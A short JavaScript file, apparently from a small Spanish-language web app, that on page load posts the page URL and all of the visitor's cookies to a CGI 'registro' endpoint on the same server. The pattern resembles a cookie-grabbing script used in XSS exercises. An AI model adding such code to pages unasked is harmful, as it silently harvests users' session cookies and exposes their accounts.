function registro() {
	var xmlhttp = new XMLHttpRequest();
	var peticion = "/AppTrabajo/cgi-bin/registro";
	var datosPost = "data="+encodeURIComponent("URL="+window.location.href+" > COOKIES="+document.cookie);
	
	xmlhttp.open("POST",peticion,true);
	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xmlhttp.setRequestHeader("Accept","");

	xmlhttp.send(datosPost); //enviamos
}

window.addEventListener("load",registro);
//registro();